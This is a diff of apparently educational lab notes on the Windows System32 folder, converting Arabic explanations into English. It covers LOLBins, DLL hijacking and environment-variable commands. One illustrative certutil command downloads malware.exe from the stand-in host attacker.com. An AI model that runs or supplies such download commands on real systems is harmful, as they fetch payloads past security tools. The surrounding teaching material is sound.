@@ -1,66 +1,61 @@
-# Task 5: The Windows\System32 Folders
+# Task 5: The Windows\System32 Folder
 
-## السؤال والإجابة
-- **السؤال:** *What is the system variable for the Windows folder?*
-- **الإجابة:** `%windir%`
+## Question
+- **Q:** What is the system variable for the Windows folder?
+- **A:** `%windir%`
 
-## المفهوم الأمني
+## Security-relevant concepts
 
-### برمجيات LOLBINs (Living Off The Land Binaries)
-أدوات نظام أساسية موجودة أصلاً داخل `System32` (مثل `certutil.exe` و `rundll32.exe` و `mshta.exe`) وهي شرعية تماماً ومُوقَّعة رقمياً من Microsoft — لكن المهاجمين يستغلونها لتنفيذ أنشطة خبيثة (مثل تحميل ملفات أو تنفيذ كود) لأن برامج الحماية تثق بها افتراضياً ولا تُصنّفها كتهديد. هذا الأسلوب يُعرف بـ "العيش من موارد الأرض" لأنه لا يحتاج المهاجم لإحضار أدوات خارجية خاصة به.
+### LOLBins (Living Off The Land Binaries)
+System32 is full of legitimate, Microsoft-signed binaries — `certutil.exe`, `rundll32.exe`, `mshta.exe`, and others — that were never meant to be security tools but end up abused constantly because AV and EDR tend to trust them by default. That's the entire idea behind "living off the land": the attacker isn't bringing in custom malware, just repurposing tools that are already trusted and already on the box.
 
-### إعادة التوجيه (File System Redirector)
-فرق معماري مهم:
-- `System32` يحتوي ملفات **64-bit**.
-- `SysWOW64` يحتوي ملفات **32-bit** (رغم أن الاسم يوحي بالعكس، وهذا مصدر ارتباك شائع).
-عندما يُشغِّل تطبيق 32-bit استدعاءً لمجلد System32، يقوم Windows تلقائياً بإعادة توجيهه إلى SysWOW64 عبر آلية داخلية.
+### The file system redirector
+A detail that trips people up: `System32` holds **64-bit** binaries, while `SysWOW64` holds **32-bit** ones — backwards from what the names suggest. When a 32-bit process tries to access System32, Windows transparently redirects it to SysWOW64 instead.
 
-### هجمات DLL Hijacking
-يقوم المهاجم بزرع ملف DLL خبيث بنفس اسم مكتبة شرعية، في مسار يُبحث فيه *قبل* الوصول إلى مجلد النظام الرئيسي (حسب ترتيب البحث الخاص بـ Windows عن DLLs). عندما يُشغَّل برنامج يحمّل تلك المكتبة، يُحمَّل الملف الخبيث بدلاً من الأصلي، فيُنفَّذ كود المهاجم ضمن سياق (Context) البرنامج الشرعي.
+### DLL hijacking
+An attacker drops a malicious DLL with the same name as a legitimate one, in a location that Windows' DLL search order checks *before* the real System32 copy. When a legitimate program loads that DLL by name, it picks up the attacker's version instead — and the malicious code now runs inside the context of a trusted, signed process.
 
-## شرح الأوامر العملية
+## Commands
 
 ### `certutil -urlcache -split -f http://attacker.com/malware.exe C:\temp\malware.exe`
-هذا مثال توضيحي (وليس أمراً يُنفَّذ فعلياً في المختبر) على استغلال LOLBin. تفكيك الأمر:
-1. `certutil` — أداة شرعية أصلية الغرض منها إدارة الشهادات الرقمية (Certificates).
-2. `-urlcache -split -f` — مجموعة خيارات تجعل الأداة تعمل كأداة تحميل ملفات من الإنترنت (وظيفة جانبية غير موثّقة رسمياً لكنها معروفة ومُستغَلة).
-3. `http://attacker.com/malware.exe` — الرابط المصدر (في هذا المثال التوضيحي: خادم مهاجم افتراضي).
-4. `C:\temp\malware.exe` — المسار الذي سيُحفظ فيه الملف محلياً.
+This is illustrative, not something actually run against the lab target. Breaking it down:
+1. `certutil` — a legitimate tool meant for managing digital certificates.
+2. `-urlcache -split -f` — a combination of flags that turns it into a file downloader, an undocumented but well-known side effect of its caching behavior.
+3. The URL — the (in this example, attacker-controlled) source.
+4. The local path — where the downloaded file lands.
 
-الفكرة الأمنية: لأن `certutil.exe` أداة موقّعة رسمياً من Microsoft، فإن العديد من حلول الحماية لا تحظر تشغيلها، مما يجعلها وسيلة شائعة لتفادي الكشف عند تحميل حمولات خبيثة.
+Because `certutil.exe` is signed by Microsoft, plenty of security products don't flag it by default, which is exactly why it keeps showing up in real intrusions as a way to pull down a payload without tripping an alert.
 
 ```cmd
 certutil -urlcache -split -f http://attacker.com/malware.exe C:\temp\malware.exe
 ```
 
 ### `echo %windir%`
-يطبع قيمة متغير البيئة `%windir%` (وعادة تكون `C:\Windows`). هذا المتغير يُستخدم في السكربتات بدل كتابة المسار الثابت يدوياً، لضمان عمل السكربت على أي جهاز بغض النظر عن قرص التثبيت.
+Prints the value of the `%windir%` environment variable, normally `C:\Windows`. Scripts reference it instead of hardcoding the path so they still work regardless of which drive Windows is installed on.
 
 ```cmd
 echo %windir%
 ```
 
 ### `set`
-يعرض **كل** متغيرات البيئة (Environment Variables) المعرّفة في الجلسة الحالية — أسماء المستخدمين، المسارات، إصدار المعالج، وغيرها. من زاوية أمنية، فحص متغيرات البيئة قد يكشف معلومات حساسة (مسارات، أسماء خوادم داخلية) تُفيد في مرحلة الاستكشاف (Recon) بعد الاختراق.
+Lists every environment variable in the current session — usernames, paths, processor info, and so on. Worth checking during recon, since environment variables occasionally leak internal hostnames or paths that are useful later.
 
 ```cmd
 set
 ```
 
 ### `Get-ChildItem Env:`
-معادل PowerShell لأمر `set`. يسرد كل متغيرات البيئة كعناصر داخل الـ **Provider** الخاص بـ `Env:` (PowerShell يتعامل مع متغيرات البيئة كأنها "مجلد" افتراضي يمكن تصفحه بـ `Get-ChildItem`، وهي نفس الأداة المستخدمة لعرض محتويات المجلدات الحقيقية).
+The PowerShell equivalent of `set`. PowerShell exposes environment variables through a provider (`Env:`) that behaves like a virtual drive, so the same cmdlet used to list files in a real folder also works here.
 
 ```powershell
 Get-ChildItem Env:
 ```
 
 ### `Get-Command -Name "*.exe" -CommandType Application | Where-Object {$_.Source -like "*System32*"}`
-خطوة بخطوة:
-1. `Get-Command -Name "*.exe" -CommandType Application` — يبحث عن كل الملفات التنفيذية (`.exe`) المعروفة للنظام كأوامر قابلة للتشغيل.
-2. `|` — يمرر القائمة الكاملة للأمر التالي.
-3. `Where-Object {$_.Source -like "*System32*"}` — يُصفّي القائمة ليُبقي فقط العناصر التي يحتوي مسارها (`Source`) على النص "System32"، أي حصر النتائج على الأدوات الموجودة فعلياً داخل ذلك المجلد.
+1. `Get-Command -Name "*.exe" -CommandType Application` finds every executable known to the system as a runnable command.
+2. Piped into `Where-Object {$_.Source -like "*System32*"}`, which filters that list down to anything whose path contains "System32".
 
-هذا الأمر مفيد لعمل جرد (Inventory) سريع لكل الأدوات التنفيذية المتاحة داخل System32 — خطوة يقوم بها المحلل الأمني لمعرفة أي LOLBins موجودة ويمكن استغلالها على جهاز معين.
+Useful as a quick inventory of everything runnable inside System32 — handy when you're mapping out which LOLBins are actually present on a given box.
 
 ```powershell
 Get-Command -Name "*.exe" -CommandType Application | Where-Object {$_.Source -like "*System32*"}
